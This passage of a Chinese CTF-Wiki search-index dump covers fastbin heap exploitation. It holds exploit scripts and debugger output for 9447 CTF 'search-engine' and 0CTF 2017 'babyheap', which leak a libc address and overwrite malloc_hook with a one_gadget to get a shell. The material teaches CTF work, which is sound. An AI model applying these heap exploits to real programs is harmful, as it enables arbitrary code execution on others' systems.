 \nindex_sentence\n(\nb\n \n*\n \n0x60\n)\n\n\n    \none_gadget_addr\n \n=\n \nlibc_base\n \n+\n \n0xf02a4\n\n    \npayload\n \n=\n \na\n \n*\n \n0x13\n \n+\n \np64\n(\none_gadget_addr\n)\n\n    \npayload\n \n=\n \npayload\n.\nljust\n(\n0x60\n,\n \nf\n)\n\n    \n#gdb.attach(p)\n\n    \nindex_sentence\n(\npayload\n)\n\n    \np\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u591a\u9009\u62e9\u51e0\u4e2a one_gadget \u5730\u5740\uff0c\u56e0\u4e3a one_gadget \u6210\u529f\u662f\u6709\u6761\u4ef6\u7684\u3002\n\n\nshell\n\n\n\u279c  2015_9447ctf_search-engine git:\n(\nmaster\n)\n python exp.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n    FORTIFY:  Enabled\n\n[\n+\n]\n Starting \nlocal\n process \n./search\n: pid \n31158\n\n\n[\n*\n]\n PID: \n31158\n\n\n[\n+\n]\n unsortedbin addr: 0x7f802e73bb78\n\n[\n+\n]\n libc base addr: 0x7f802e377000\n\n[\n*\n]\n Switching to interactive mode\nEnter the sentence:\n$ ls\nexp.py       search      search.id1  search.nam\nlibc.so.6  search.id0  search.id2  search.til\n\n\n\n\n\u5f53\u7136\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u79cd\n\u65b9\u6cd5\n\uff0c\u5c06 chunk \u5206\u914d\u5230\u6808\u4e0a\u3002\n\n\n2017 0ctf babyheap\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2017_0ctf_babyheap git:\n(\nmaster\n)\n file babyheap                            \nbabyheap: ELF \n64\n-bit LSB shared object, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped\n\u279c  2017_0ctf_babyheap git:\n(\nmaster\n)\n checksec babyheap   \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap\n\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n\n\n\n\n64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u5206\u914d\u5668\uff0c\u4e3b\u8981\u7531\u4ee5\u4e0b\u56db\u79cd\u529f\u80fd\n\n\n  \nputs\n(\n1. Allocate\n);\n\n  \nputs\n(\n2. Fill\n);\n\n  \nputs\n(\n3. Free\n);\n\n  \nputs\n(\n4. Dump\n);\n\n  \nputs\n(\n5. Exit\n);\n\n  \nreturn\n \nprintf\n(\nCommand: \n);\n\n\n\n\n\n\u5176\u4e2d\uff0c\u6bcf\u6b21\u8bfb\u53d6\u547d\u4ee4\u7684\u51fd\u6570\u7531\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u7684\u51fd\u6570\u800c\u51b3\u5b9a\u3002\n\n\n\u901a\u8fc7\u5206\u914d\u51fd\u6570\n\n\nvoid\n \n__fastcall\n \nallocate\n(\n__int64\n \na1\n)\n\n\n{\n\n  \nsigned\n \nint\n \ni\n;\n \n// [rsp+10h] [rbp-10h]\n\n  \nsigned\n \nint\n \nv2\n;\n \n// [rsp+14h] [rbp-Ch]\n\n  \nvoid\n \n*\nv3\n;\n \n// [rsp+18h] [rbp-8h]\n\n\n  \nfor\n \n(\n \ni\n \n=\n \n0\n;\n \ni\n \n=\n \n15\n;\n \n++\ni\n \n)\n\n  \n{\n\n    \nif\n \n(\n \n!*\n(\n_DWORD\n \n*\n)(\n24LL\n \n*\n \ni\n \n+\n \na1\n)\n \n)\n\n    \n{\n\n      \nprintf\n(\nSize: \n);\n\n      \nv2\n \n=\n \nread_num\n();\n\n      \nif\n \n(\n \nv2\n \n \n0\n \n)\n\n      \n{\n\n        \nif\n \n(\n \nv2\n \n \n4096\n \n)\n\n          \nv2\n \n=\n \n4096\n;\n\n        \nv3\n \n=\n \ncalloc\n(\nv2\n,\n \n1uLL\n);\n\n        \nif\n \n(\n \n!\nv3\n \n)\n\n          \nexit\n(\n-\n1\n);\n\n        \n*\n(\n_DWORD\n \n*\n)(\n24LL\n \n*\n \ni\n \n+\n \na1\n)\n \n=\n \n1\n;\n\n        \n*\n(\n_QWORD\n \n*\n)(\na1\n \n+\n \n24LL\n \n*\n \ni\n \n+\n \n8\n)\n \n=\n \nv2\n;\n\n        \n*\n(\n_QWORD\n \n*\n)(\na1\n \n+\n \n24LL\n \n*\n \ni\n \n+\n \n16\n)\n \n=\n \nv3\n;\n\n        \nprintf\n(\nAllocate Index %d\n\\n\n,\n \n(\nunsigned\n \nint\n)\ni\n);\n\n      \n}\n\n      \nreturn\n;\n\n    \n}\n\n  \n}\n\n\n}\n\n\n\n\n\n\u7533\u8bf7\u7684 chunk \u7684\u6700\u5927\u4e3a 4096\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6bcf\u4e2a chunk \u4e3b\u8981\u6709\u4e09\u4e2a\u5b57\u6bb5\uff1a\u662f\u5426\u5728\u4f7f\u7528\uff0c\u5806\u5757\u5927\u5c0f\uff0c\u5806\u5757\u4f4d\u7f6e\u3002\u6545\u800c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u3002\n\n\n00000000 chunk           struc ; (sizeof=0x18, mappedto_6)\n00000000 inuse           dq ?\n00000008 size            dq ?\n00000010 ptr             dq ?\n00000018 chunk           ends\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\u5806\u5757\u662f\u7531 calloc \u5206\u914d\u7684\uff0c\u6240\u4ee5 chunk \u4e2d\u7684\u5185\u5bb9\u5168\u90fd\u4e3a\n\\x00\n\u3002\n\n\n\u5728\u586b\u5145\u5185\u5bb9\u7684\u529f\u80fd\u4e2d\uff0c\u4f7f\u7528\u8bfb\u53d6\u5185\u5bb9\u7684\u51fd\u6570\u662f\u76f4\u63a5\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u5b57\u7b26\u4e32\u7ed3\u5c3e\u3002\n\u800c\u4e14\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u8fd9\u4e2a\u6307\u5b9a\u957f\u5ea6\u662f\u6211\u4eec\u6307\u5b9a\u7684\uff0c\u5e76\u4e0d\u662f\u4e4b\u524d chunk \u5206\u914d\u65f6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u5806\u6ea2\u51fa\u7684\u60c5\u5f62\u3002\n\n\n__int64\n \n__fastcall\n \nfill\n(\nchunk\n \n*\na1\n)\n\n\n{\n\n  \n__int64\n \nresult\n;\n \n// rax\n\n  \nint\n \nv2\n;\n \n// [rsp+18h] [rbp-8h]\n\n  \nint\n \nv3\n;\n \n// [rsp+1Ch] [rbp-4h]\n\n\n  \nprintf\n(\nIndex: \n);\n\n  \nresult\n \n=\n \nread_num\n();\n\n  \nv2\n \n=\n \nresult\n;\n\n  \nif\n \n(\n \n(\nsigned\n \nint\n)\nresult\n \n=\n \n0\n \n \n(\nsigned\n \nint\n)\nresult\n \n=\n \n15\n \n)\n\n  \n{\n\n    \nresult\n \n=\n \nLODWORD\n(\na1\n[(\nsigned\n \nint\n)\nresult\n].\ninuse\n);\n\n    \nif\n \n(\n \n(\n_DWORD\n)\nresult\n \n==\n \n1\n \n)\n\n    \n{\n\n      \nprintf\n(\nSize: \n);\n\n      \nresult\n \n=\n \nread_num\n();\n\n      \nv3\n \n=\n \nresult\n;\n\n      \nif\n \n(\n \n(\nsigned\n \nint\n)\nresult\n \n \n0\n \n)\n\n      \n{\n\n        \nprintf\n(\nContent: \n);\n\n        \nresult\n \n=\n \nread_content\n((\nchar\n \n*\n)\na1\n[\nv2\n].\nptr\n,\n \nv3\n);\n\n      \n}\n\n    \n}\n\n  \n}\n\n  \nreturn\n \nresult\n;\n\n\n}\n\n\n\n\n\n\u5728\u91ca\u653echunk\u7684\u529f\u80fd\u4e2d\u8be5\u8bbe\u7f6e\u7684\u90fd\u8bbe\u7f6e\u4e86\u3002\n\n\n__int64\n \n__fastcall\n \nfree_chunk\n(\nchunk\n \n*\na1\n)\n\n\n{\n\n  \n__int64\n \nresult\n;\n \n// rax\n\n  \nint\n \nv2\n;\n \n// [rsp+1Ch] [rbp-4h]\n\n\n  \nprintf\n(\nIndex: \n);\n\n  \nresult\n \n=\n \nread_num\n();\n\n  \nv2\n \n=\n \nresult\n;\n\n  \nif\n \n(\n \n(\nsigned\n \nint\n)\nresult\n \n=\n \n0\n \n \n(\nsigned\n \nint\n)\nresult\n \n=\n \n15\n \n)\n\n  \n{\n\n    \nresult\n \n=\n \nLODWORD\n(\na1\n[(\nsigned\n \nint\n)\nresult\n].\ninuse\n);\n\n    \nif\n \n(\n \n(\n_DWORD\n)\nresult\n \n==\n \n1\n \n)\n\n    \n{\n\n      \nLODWORD\n(\na1\n[\nv2\n].\ninuse\n)\n \n=\n \n0\n;\n\n      \na1\n[\nv2\n].\nsize\n \n=\n \n0LL\n;\n\n      \nfree\n(\na1\n[\nv2\n].\nptr\n);\n\n      \nresult\n \n=\n \n(\n__int64\n)\na1\n[\nv2\n];\n\n      \n*\n(\n_QWORD\n \n*\n)(\nresult\n \n+\n \n16\n)\n \n=\n \n0LL\n;\n\n    \n}\n\n  \n}\n\n  \nreturn\n \nresult\n;\n\n\n}\n\n\n\n\n\ndump \u5c31\u662f\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15 chunk \u7684\u5185\u5bb9\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u6211\u4eec\u4e3b\u8981\u6709\u7684\u6f0f\u6d1e\u5c31\u662f\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u7531\u4e8e\u8be5\u7a0b\u5e8f\u51e0\u4e4e\u6240\u6709\u4fdd\u62a4\u90fd\u5f00\u542f\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u8981\u6709\u4e00\u4e9b\u6cc4\u6f0f\u624d\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u7684\u6d41\u7a0b\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740\u3002\n\n\n\u5229\u7528 fastbin attack \u5c06chunk \u5206\u914d\u5230 malloc_hook \u9644\u8fd1\u3002\n\n\n\n\n\u6cc4\u6f0f libc \u57fa\u5730\u5740\n\n\n\u7531\u4e8e\u6211\u4eec\u662f\u5e0c\u671b\u4f7f\u7528 unsorted bin \u6765\u6cc4\u6f0f libc \u57fa\u5730\u5740\uff0c\u6240\u4ee5\u5fc5\u987b\u8981\u6709 chunk \u53ef\u4ee5\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\uff0c\u6240\u4ee5\u8be5 chunk \u4e0d\u80fd\u4f7f fastbin chunk\uff0c\u4e5f\u4e0d\u80fd\u548c top chunk \u76f8\u90bb\u3002\u56e0\u4e3a\u524d\u8005\u4f1a\u88ab\u6dfb\u52a0\u5230 fastbin \u4e2d\uff0c\u540e\u8005\u5728\u4e0d\u662ffastbin \u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u8fd9\u91cc\u6784\u9020\u4e00\u4e2a small bin chunk\u3002\u5728\u5c06\u8be5 chunk \u91ca\u653e\u5230 unsorted bin \u7684\u540c\u65f6\uff0c\u4e5f\u9700\u8981\u8ba9\u53e6\u5916\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u7684 chunk \u53ef\u4ee5\u540c\u65f6\u6307\u5411\u8be5 chunk \u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u624d\u53ef\u4ee5\u8fdb\u884c\u6cc4\u6f0f\u3002\u5177\u4f53\u8bbe\u8ba1\u5982\u4e0b\n\n\n    \n# 1. leak libc base\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 0, 0x00\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 1, 0x20\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 2, 0x40\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 3, 0x60\n\n    \nallocate\n(\n0x80\n)\n  \n# idx 4, 0x80\n\n    \n# free idx 1, 2, fastbin[0]-\nidx1-\nidx2-\nNULL\n\n    \nfree\n(\n2\n)\n\n    \nfree\n(\n1\n)\n\n\n\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u7533\u8bf7\u4e86 5 \u4e2achunk\uff0c\u5e76\u91ca\u653e\u4e86\u4e24\u4e2achunk\uff0c\u6b64\u65f6\u5806\u7684\u60c5\u51b5\u5982\u4e0b\u3002\n\n\npwndbg\n x/20gx 0x55a03ca22000\n0x55a03ca22000: 0x0000000000000000  0x0000000000000021 idx \n0\n\n0x55a03ca22010: 0x0000000000000000  0x0000000000000000\n0x55a03ca22020: 0x0000000000000000  0x0000000000000021 idx \n1\n\n0x55a03ca22030: 0x000055a03ca22040  0x0000000000000000\n0x55a03ca22040: 0x0000000000000000  0x0000000000000021 idx \n2\n\n0x55a03ca22050: 0x0000000000000000  0x0000000000000000\n0x55a03ca22060: 0x0000000000000000  0x0000000000000021 idx \n3\n\n0x55a03ca22070: 0x0000000000000000  0x0000000000000000\n0x55a03ca22080: 0x0000000000000000  0x0000000000000091 idx \n4\n\n0x55a03ca22090: 0x0000000000000000  0x0000000000000000\npwndbg\n fastbins \nfastbins\n0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22040 \u25c2\u2014 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0\n\n\n\n\n\u5f53\u6211\u4eec\u7f16\u8f91 idx0 \u540e\uff0c\u786e\u5b9e\u5df2\u7ecf\u5c06\u5176\u6307\u5411idx4\u4e86\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u53ef\u4ee5\u6210\u529f\u662f\u56e0\u4e3a\u5806\u7684\u59cb\u7ec8\u662f 4KB \u5bf9\u9f50\u7684\uff0c\u6240\u4ee5idx 4\u7684\u8d77\u59cb\u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5fc5\u7136\u662f0x80\u3002\n\n\n    \n# edit idx 0 chunk to particial overwrite idx1\ns fd to point to idx4\n\n    \npayload\n \n=\n \n0x10\n \n*\n \na\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x21\n)\n \n+\n \np8\n(\n0x80\n)\n\n    \nfill\n(\n0\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n\n\n\n\n\u4fee\u6539\u6210\u529f\u540e\u5982\u4e0b\n\n\npwndbg\n x/20gx 0x55a03ca22000\n0x55a03ca22000: 0x0000000000000000  0x0000000000000021\n0x55a03ca22010: 0x6161616161616161  0x6161616161616161\n0x55a03ca22020: 0x0000000000000000  0x0000000000000021\n0x55a03ca22030: 0x000055a03ca22080  0x0000000000000000\n0x55a03ca22040: 0x0000000000000000  0x0000000000000021\n0x55a03ca22050: 0x0000000000000000  0x0000000000000000\n0x55a03ca22060: 0x0000000000000000  0x0000000000000021\n0x55a03ca22070: 0x0000000000000000  0x0000000000000000\n0x55a03ca22080: 0x0000000000000000  0x0000000000000091\n0x55a03ca22090: 0x0000000000000000  0x0000000000000000\npwndbg\n fastbins \nfastbins\n0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22080 \u25c2\u2014 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0\n\n\n\n\n\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u4e24\u4e2a\u65f6\uff0c\u7b2c\u4e8c\u4e2a\u7533\u8bf7\u5230\u7684\u5c31\u662fidx 4\u5904\u7684chunk\u3002\u4e3a\u4e86\u80fd\u591f\u7533\u8bf7\u6210\u529f\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd idx4 \u7684size \u4e0e\u5f53\u524d fastbin \u7684\u5927\u5c0f\u4e00\u81f4\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u5f97\u4fee\u6539\u5b83\u7684\u5927\u5c0f\u3002\u7533\u8bf7\u6210\u529f\u540e\uff0cidx2\u4f1a\u6307\u5411idx4\u3002\n\n\n    \n# if we want to allocate at idx4, we must set it\ns size as 0x21\n\n    \npayload\n \n=\n \n0x10\n \n*\n \na\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x21\n)\n\n    \nfill\n(\n3\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 1\n\n    \nallocate\n(\n0x10\n)\n  \n# idx 2, which point to idx4\ns location\n\n\n\n\n\n\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u5c06 idx 4 \u653e\u5230 unsorted bin \u4e2d\u7684\u8bdd\uff0c\u4e3a\u4e86\u9632\u6b62\u5176\u4e0etop chunk \u5408\u5e76\uff0c\u6211\u4eec\u9700\u8981\u518d\u6b21\u7533\u8bf7\u4e00\u4e2achunk\u3002\u6b64\u540e\u518d\u91ca\u653e idx4 \u5c31\u4f1a\u8fdb\u5165 unsorted bin\u4e2d\u53bb\u4e86\u3002\u6b64\u65f6\u7531\u4e8e idx2 \u4e5f\u6307\u5411\u8fd9\u4e2a\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u5c55\u793a\u4ed6\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u5f97\u5230unsorted bin\u7684\u5730\u5740\u4e86\u3002\n\n\n    \n# if want to free idx4 to unsorted bin, we must fix its size\n\n    \npayload\n \n=\n \n0x10\n \n*\n \na\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x91\n)\n\n    \nfill\n(\n3\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \n# allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk\n\n    \nallocate\n(\n0x80\n)\n  \n# idx 5\n\n    \nfree\n(\n4\n)\n\n    \n# as idx 2 point to idx4, just show this\n\n    \ndump\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\nContent: \n\\n\n)\n\n    \nunsortedbin_addr\n \n=\n \nu64\n(\np\n.\nrecv\n(\n8\n))\n\n    \nmain_arena\n \n=\n \nunsortedbin_addr\n \n-\n \noffset_unsortedbin_main_arena\n\n    \nlog\n.\nsuccess\n(\nmain arena addr: \n \n+\n \nhex\n(\nmain_arena\n))\n\n    \nmain_arena_offset\n \n=\n \n0x3c4b20\n\n    \nlibc_base\n \n=\n \nmain_arena\n \n-\n \nmain_arena_offset\n\n    \nlog\n.\nsuccess\n(\nlibc base addr: \n \n+\n \nhex\n(\nlibc_base\n))\n\n\n\n\n\n\u5206\u914dchunk\u5230malloc_hook\u9644\u8fd1\n\n\n\u7531\u4e8e malloc hook \u9644\u8fd1\u7684 chunk \u5927\u5c0f\u4e3a 0x7f\uff0c\u6240\u4ee5\u6570\u636e\u533a\u57df\u4e3a0x60\u3002\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u7684\u65f6\u5019\uff0c\u5bf9\u5e94 fastbin \u94fe\u8868\u4e2d\u6ca1\u6709\u76f8\u5e94\u5927\u5c0fchunk\uff0c\u6240\u4ee5\u6839\u636e\u5806\u5206\u914d\u5668\u89c4\u5219\uff0c\u5b83\u4f1a\u4f9d\u6b21\u5904\u7406unsorted bin\u4e2d\u7684chunk\uff0c\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684bin\u4e2d\uff0c\u4e4b\u540e\u4f1a\u518d\u6b21\u5c1d\u8bd5\u5206\u914d chunk\uff0c\u56e0\u4e3a\u4e4b\u524d\u91ca\u653e\u7684 chunk \u6bd4\u5f53\u524d\u7533\u8bf7\u7684 chunk \u5927\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u5176\u524d\u9762\u5206\u5272\u51fa\u6765\u4e00\u5757\u3002\u6240\u4ee5 idx2 \u4ecd\u7136\u6307\u5411\u8be5\u4f4d\u7f6e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u7684\u529e\u6cd5\u5148\u91ca\u653e\u7533\u8bf7\u5230\u7684chunk\uff0c\u7136\u540e\u518d\u6b21\u4fee\u6539 fd \u6307\u9488\u4e3a fake chunk \u5373\u53ef\u3002\u6b64\u540e\u6211\u4eec\u4fee\u6539 malloc_hook \u5904\u7684\u6307\u9488\u5373\u53ef\u5f97\u5230\u89e6\u53d1 onegadget\u3002\n\n\n# 2. malloc to malloc_hook nearby\n\n\n# allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4\n\n\nallocate\n(\n0x60\n)\n\n\nfree\n(\n4\n)\n\n\n# edit idx4\ns fd point to fake chunk\n\n\nfake_chunk_addr\n \n=\n \nmain_arena\n \n-\n \n0x33\n\n\nfake_chunk\n \n=\n \np64\n(\nfake_chunk_addr\n)\n\n\nfill\n(\n2\n,\n \nlen\n(\nfake_chunk\n),\n \nfake_chunk\n)\n\n\n\nallocate\n(\n0x60\n)\n  \n# idx 4\n\n\nallocate\n(\n0x60\n)\n  \n# idx 6\n\n\n\none_gadget_addr\n \n=\n \nlibc_base\n \n+\n \n0x4526a\n\n\npayload\n \n=\n \n0x13\n \n*\n \na\n \n+\n \np64\n(\none_gadget_addr\n)\n\n\nfill\n(\n6\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n\n# trigger malloc_hook\n\n\nallocate\n(\n0x100\n)\n\n\np\n.\ninteractive\n()\n \n\n\n\u540c\u65f6\uff0c\u8fd9\u91cc\u7684 onegadget \u5730\u5740\u4e5f\u53ef\u80fd\u9700\u8981\u5c1d\u8bd5\u591a\u6b21\u3002\n\n\n\u9898\u76ee\n\n\n\n\nL-CTF2016\u2013pwn200\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/\n\n\nhttp://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html\n\n\nhttps://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717", 
            "title": "Fastbin Attack"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#fastbin-attack", 
            "text": "", 
            "title": "Fastbin Attack"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_1", 
            "text": "fastbin attack \u662f\u4e00\u7c7b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u662f\u6307\u6240\u6709\u57fa\u4e8e fastbin \u673a\u5236\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u3002\u8fd9\u7c7b\u5229\u7528\u7684\u524d\u63d0\u662f\uff1a   \u5b58\u5728\u5806\u6ea2\u51fa\u3001use-after-free \u7b49\u80fd\u63a7\u5236 chunk \u5185\u5bb9\u7684\u6f0f\u6d1e  \u6f0f\u6d1e\u53d1\u751f\u4e8e fastbin \u7c7b\u578b\u7684 chunk \u4e2d   \u5982\u679c\u7ec6\u5206\u7684\u8bdd\uff0c\u53ef\u4ee5\u505a\u5982\u4e0b\u7684\u5206\u7c7b\uff1a   Fastbin Double Free  House of Spirit  Alloc to Stack  Arbitrary Alloc   \u5176\u4e2d\uff0c\u524d\u4e24\u79cd\u4e3b\u8981\u6f0f\u6d1e\u4fa7\u91cd\u4e8e\u5229\u7528  free  \u51fd\u6570\u91ca\u653e \u771f\u7684 chunk \u6216\u4f2a\u9020\u7684 chunk \uff0c\u7136\u540e\u518d\u6b21\u7533\u8bf7 chunk \u8fdb\u884c\u653b\u51fb\uff0c\u540e\u4e24\u79cd\u4fa7\u91cd\u4e8e\u6545\u610f\u4fee\u6539  fd  \u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528  malloc  \u7533\u8bf7\u6307\u5b9a\u4f4d\u7f6e chunk \u8fdb\u884c\u653b\u51fb\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_2", 
            "text": "fastbin attack \u5b58\u5728\u7684\u539f\u56e0\u5728\u4e8e fastbin \u662f\u4f7f\u7528\u5355\u94fe\u8868\u6765\u7ef4\u62a4\u91ca\u653e\u7684\u5806\u5757\u7684\uff0c\u5e76\u4e14\u7531 fastbin \u7ba1\u7406\u7684 chunk \u5373\u4f7f\u88ab\u91ca\u653e\uff0c\u5176 next_chunk \u7684 prev_inuse \u4f4d\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002\n\u6211\u4eec\u6765\u770b\u4e00\u4e0b fastbin \u662f\u600e\u6837\u7ba1\u7406\u7a7a\u95f2 chunk \u7684\u3002 int main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x30);\n    chunk2=malloc(0x30);\n    chunk3=malloc(0x30);\n    //\u8fdb\u884c\u91ca\u653e\n    free(chunk1);\n    free(chunk2);\n    free(chunk3);\n    return 0;\n} \n\u91ca\u653e\u524d 0x602000:   0x0000000000000000  0x0000000000000041  === chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000041  === chunk2\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000041  === chunk3\n0x602090:   0x0000000000000000  0x0000000000000000\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000020f41  === top chunk \n\u6267\u884c\u4e09\u6b21 free \u8fdb\u884c\u91ca\u653e\u540e 0x602000:   0x0000000000000000  0x0000000000000041  === chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000041  === chunk2\n0x602050:   0x0000000000602000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000041  === chunk3\n0x602090:   0x0000000000602040  0x0000000000000000\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000020f41  === top chunk \n\u6b64\u65f6\u4f4d\u4e8e main_arena \u4e2d\u7684 fastbin \u94fe\u8868\u4e2d\u5df2\u7ecf\u50a8\u5b58\u4e86\u6307\u5411 chunk3 \u7684\u6307\u9488\uff0c\u5e76\u4e14 chunk 3\u30012\u30011\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868 Fastbins[idx=2, size=0x30,ptr=0x602080]\n=== Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)\n=== Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)\n=== Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)  \n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u56fe\u7247\u6765\u8868\u793a\u8fd9\u4e00\u70b9", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#fastbin-double-free", 
            "text": "", 
            "title": "Fastbin Double Free"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_3", 
